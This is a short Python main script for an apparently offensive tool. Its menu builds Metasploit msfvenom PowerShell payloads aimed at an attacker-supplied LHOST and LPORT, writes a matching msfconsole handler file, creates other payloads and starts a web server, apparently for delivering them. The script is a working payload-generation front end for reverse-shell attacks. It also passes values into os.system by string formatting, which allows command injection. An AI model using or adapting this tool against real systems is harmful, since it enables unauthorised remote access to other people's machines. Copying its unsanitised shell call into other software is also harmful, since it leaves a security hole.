import os
import sys

from core.Menu import Menu
from core.ui import UI
from module.create_operation import operation
from module.msfvenom_create.msfvenom import msfvenom_payload_create
from module.webserver.SimpleServer import webserver

if __name__ == '__main__':

    if not os.path.exists('output/'):
        os.mkdir('output')

    if not os.path.exists('temp/'):
        os.mkdir('temp')

    #initialize
    exit_flag = False
    ui = UI()
    menu = Menu()
    #Menu initial
    while not exit_flag:
        ui.banner()
        menu_show = ui.showmenu(menu.options)
        choice = input('>>>')
        if choice in menu.allowinput:
            if choice == 'sc':
                mod = msfvenom_payload_create()
                os.system('msfvenom -p %s LHOST=%s LPORT=%s -f powershell > %stemp.ps1'
                          %(mod.payload(),mod.IP,mod.port,mod.outputpath(),))
                mod.generate_msfconsole_rc()
                input('plese type Enter to Continue')
            if choice == 'og':
                mod = operation()
                mod.create_payload()
                input('plese type Enter to Continue')
            if choice == 'web':
                mod = webserver()
            if choice == 'exit':
                sys.exit()

